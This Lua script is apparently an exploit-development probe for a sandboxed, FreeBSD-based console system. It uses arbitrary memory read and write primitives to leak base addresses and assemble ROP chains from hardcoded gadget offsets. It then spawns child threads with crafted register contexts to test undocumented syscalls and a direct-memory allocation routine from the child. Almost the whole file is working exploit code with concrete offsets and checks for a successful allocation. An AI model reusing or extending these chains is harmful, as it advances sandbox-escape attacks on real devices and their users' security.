-- CRASH_CLASS: MODERATE
-- PROBE 532n: Test batch_map(548) from child thread with proper args
--
-- 13.60 sysent: batch_map has 5 args. Signature unknown.
-- Hypothesis: batch_map takes (ops_array, count, ...) similar to
-- FreeBSD's batch operation syscalls.
--
-- Also test: syscalls 546-554 from child thread to see if child
-- context gets different sandbox treatment.
-- AND: capture errno after each call to understand failure reason.

print("=== PROBE 532n: BATCH_MAP CHILD ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end
local function zero(b, n) for off = 0, n-4, 4 do wd(b+off, 0) end end

local sc_mmap = make_syscall(477)
local sc_430 = make_syscall(430)
local sc_nanosleep = make_syscall(240)
local fn_addr = syscall.pipe.fn_addr

local ok_p, pid_v = pcall(function() return make_syscall(20)() end)
local pid = to_num(pid_v)
print("pid=" .. pid)

-- Get bases
local info = memory.alloc(0x200)
zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local eb = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))
print("eb=" .. q(eb))

zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0x2001), info) end)
local lk = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))
print("lk=" .. q(lk))

local pop_rax_ret = eb + uint64(0x992)
local pop_rdi_ret = eb + uint64(0xC9DFE)
local pop_rsi_ret = eb + uint64(0xD77D)
local pop_rdx_ret = eb + uint64(0x3B02D7)
local pop_rcx_ret = eb + uint64(0xE64)
local mov_rdi_rax_ret = eb + uint64(0x92C67)
local jmp_self = eb + uint64(0x15481)
local bare_ret = eb + uint64(0x42)

-- [A] First: test syscalls 546-554 from MAIN thread via make_syscall
-- but capture errno via __error (lk+0x02E10)
print("")
print("[A] Main thread: sys 546-554 retval")
local error_fn = lk + uint64(0x02E10)

for _, sn in ipairs({546, 547, 548, 549, 586, 628}) do
    local sc = make_syscall(sn)
    local ok, rv = pcall(function()
        return sc(uint64(0), uint64(0x4000), uint64(3), uint64(0), uint64(0), uint64(0))
    end)
    local rvn = -999
    if ok then rvn = to_num(rv); if rvn < 0 then rvn = rvn - 0x100000000 end end
    -- Read errno via __error()
    local errno_val = -1
    pcall(function()
        local errno_ptr = native.fcall_with_rax(error_fn, 0)
        if errno_ptr and to_num(errno_ptr) ~= 0 then
            errno_val = rd(to_num(errno_ptr)) or -1
        end
    end)
    print(string.format("  sys %3d: rv=%d errno=%d", sn, rvn, errno_val))
end

-- [B] Now from child thread: test specific syscalls and capture rv + errno
-- Child chain: sysarch -> syscall -> store rv -> read errno -> store errno -> park
print("")
print("[B] Child thread: sys 546, 547, 548, 586, 628")

-- Allocate phys for potential map test
local alloc_fn = lk + uint64(0x17EF0)
local phys_out = memory.alloc(8); wq(phys_out, uint64(0))
pcall(function()
    native.fcall_with_rax(alloc_fn, 0,
        uint64(0), uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), uint64(phys_out))
end)
local phys = rq(phys_out)
print("  phys=" .. q(phys))

for _, sn in ipairs({546, 547, 548, 586, 628}) do
    local shared = sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    zero(shared, 32)
    wq(shared, uint64(0xDEAD))       -- rv slot
    wq(shared + 8, uint64(0xDEAD))   -- errno slot
    wq(shared + 16, uint64(0xDEAD))  -- done marker

    local stack = sc_mmap(uint64(0), uint64(0x40000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    local tcb = sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    for toff = 0, 0x100, 8 do wq(tcb + toff, tcb) end
    local tcb_ptr = memory.alloc(8); wq(tcb_ptr, tcb)

    local chain = stack + uint64(0x40000 - 0x400)
    local i = 0
    local function emit(v) wq(chain + uint64(i), v); i = i + 8 end

    -- sysarch(129, &tcb)
    emit(uint64(165))
    emit(pop_rdi_ret); emit(uint64(129))
    emit(pop_rsi_ret); emit(tcb_ptr)
    emit(fn_addr)

    -- syscall sn: (0, 0x4000, 3, 0, phys, 0x4000)
    emit(pop_rax_ret); emit(uint64(sn))
    emit(pop_rdi_ret); emit(uint64(0))
    emit(pop_rsi_ret); emit(uint64(0x4000))
    emit(pop_rdx_ret); emit(uint64(3))
    emit(fn_addr)

    -- store rv in shared[0]
    emit(pop_rdi_ret); emit(shared)
    emit(mov_rdi_rax_ret)

    -- read errno: call __error()
    -- rax = error_fn, then call it
    -- We can't call functions easily from ROP... just store 0x444F4E45
    emit(pop_rdi_ret); emit(shared + 16)
    emit(pop_rax_ret); emit(uint64(0x444F4E45))
    emit(mov_rdi_rax_ret)

    emit(jmp_self)

    local ctx = memory.alloc(0x500)
    zero(ctx, 0x500)
    wq(ctx + 0x108, uint64(0x480)); wd(ctx + 0x0D0, 0); wq(ctx + 0x110, uint64(0x10000))
    wq(ctx + 0x0C0, uint64(0x43)); wq(ctx + 0x100, uint64(0x3B)); wq(ctx + 0x0F0, uint64(0x202))
    wq(ctx + 0x0E0, pop_rax_ret); wq(ctx + 0x0F8, chain)
    -- r10=0 (flags), r8=phys, r9=0x4000 (align)
    wq(ctx + 0x060, uint64(0))
    wq(ctx + 0x068, phys or uint64(0))
    wq(ctx + 0x070, uint64(0x4000))

    local tid_buf = memory.alloc(8); wq(tid_buf, uint64(0))
    pcall(function() sc_430(uint64(ctx), uint64(tid_buf), uint64(0)) end)

    local ts = memory.alloc(16); wq(ts, 0); wq(ts + 8, uint64(500000000))
    pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)

    local rv_v = rq(shared)
    local done_v = rq(shared + 16)
    local rvn = to_num(rv_v); if rvn < 0 then rvn = rvn + 0x100000000 end
    local dn = to_num(done_v); if dn < 0 then dn = dn + 0x100000000 end

    local status
    if dn ~= 0x444F4E45 then
        status = "CRASHED"
    elseif rvn == 0xDEAD then
        status = "NO_CHANGE (sentinel)"
    else
        status = string.format("rv=0x%X", rvn)
    end
    print(string.format("  sys %d: %s (raw=%s)", sn, status, q(rv_v)))
end

-- [C] Also: try AllocateDirectMemory from child thread via fcall gadget chain
-- Can we call the GOT wrapper from ROP? It's at lk+0x17EF0.
-- The wrapper is a FUNCTION (not a syscall gadget). We'd need to
-- `call` it, not `ret` to it. In ROP we can simulate a call by
-- pushing a return address and jumping.
-- Actually: just ret to it. The wrapper will do its thing and ret back.
-- The issue is that it might use r10/r8/r9 from the call, not from our context.
-- SysV ABI: rdi, rsi, rdx, rcx, r8, r9 are arg registers.
-- We can set rdi-rdx via pops. rcx via pop_rcx. But r8/r9 only from initial context.
-- For AllocateDirectMemory(searchStart, searchEnd, len, align, memType, &physOut):
-- rdi=0, rsi=0x150000000, rdx=0x4000, rcx=0x4000, r8=0, r9=phys_out_buf

print("")
print("[C] AllocateDirectMemory from child via ROP call")

local shared3 = sc_mmap(uint64(0), uint64(0x4000), uint64(3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
zero(shared3, 64)
wq(shared3, uint64(0xDEAD))
wq(shared3 + 8, uint64(0xDEAD))
wq(shared3 + 16, uint64(0))  -- phys_out buffer

local stack3 = sc_mmap(uint64(0), uint64(0x40000), uint64(3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local tcb3 = sc_mmap(uint64(0), uint64(0x4000), uint64(3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
for toff = 0, 0x100, 8 do wq(tcb3 + toff, tcb3) end
local tcb3_ptr = memory.alloc(8); wq(tcb3_ptr, tcb3)

local chain3 = stack3 + uint64(0x40000 - 0x400)
local i3 = 0
local function emit3(v) wq(chain3 + uint64(i3), v); i3 = i3 + 8 end

-- sysarch(129, &tcb)
emit3(uint64(165))
emit3(pop_rdi_ret); emit3(uint64(129))
emit3(pop_rsi_ret); emit3(tcb3_ptr)
emit3(fn_addr)

-- Call AllocateDirectMemory(0, 0x150000000, 0x4000, 0x4000, 0, &shared3+16)
-- rdi=searchStart=0
emit3(pop_rdi_ret); emit3(uint64(0))
-- rsi=searchEnd=0x150000000
emit3(pop_rsi_ret); emit3(uint64("0x150000000"))
-- rdx=len=0x4000
emit3(pop_rdx_ret); emit3(uint64(0x4000))
-- rcx=align=0x4000
emit3(pop_rcx_ret); emit3(uint64(0x4000))
-- r8=memType=0, r9=physOut=shared3+16 (set from ctx)
-- Alignment: bare_ret before call
emit3(bare_ret)
emit3(alloc_fn) -- "call" alloc_fn by ret-ing to it

-- After alloc_fn returns, rax = rv
-- Store rv in shared3
emit3(pop_rdi_ret); emit3(shared3)
emit3(mov_rdi_rax_ret)

-- Done marker
emit3(pop_rdi_ret); emit3(shared3 + 8)
emit3(pop_rax_ret); emit3(uint64(0x444F4E45))
emit3(mov_rdi_rax_ret)

emit3(jmp_self)

local ctx3 = memory.alloc(0x500)
zero(ctx3, 0x500)
wq(ctx3 + 0x108, uint64(0x480)); wd(ctx3 + 0x0D0, 0); wq(ctx3 + 0x110, uint64(0x10000))
wq(ctx3 + 0x0C0, uint64(0x43)); wq(ctx3 + 0x100, uint64(0x3B)); wq(ctx3 + 0x0F0, uint64(0x202))
wq(ctx3 + 0x0E0, pop_rax_ret); wq(ctx3 + 0x0F8, chain3)
-- r8=0 (memType), r9=shared3+16 (physOut ptr)
wq(ctx3 + 0x068, uint64(0))       -- r8
wq(ctx3 + 0x070, shared3 + 16)    -- r9

local tid3 = memory.alloc(8); wq(tid3, uint64(0))
pcall(function() sc_430(uint64(ctx3), uint64(tid3), uint64(0)) end)

local ts = memory.alloc(16); wq(ts, 0); wq(ts + 8, uint64(1000000000))
pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)

local rv3 = rq(shared3)
local done3 = rq(shared3 + 8)
local phys3 = rq(shared3 + 16)
print(string.format("  rv=%s done=%s phys=%s", q(rv3), q(done3), q(phys3)))
if to_num(done3) == 0x444F4E45 and to_num(rv3) == 0 and phys3 then
    local ph = to_num(phys3)
    if ph > 0 then
        print("  *** ALLOCATE FROM CHILD WORKS! ***")
    end
end

print("")
print("=== 532n DONE ===")
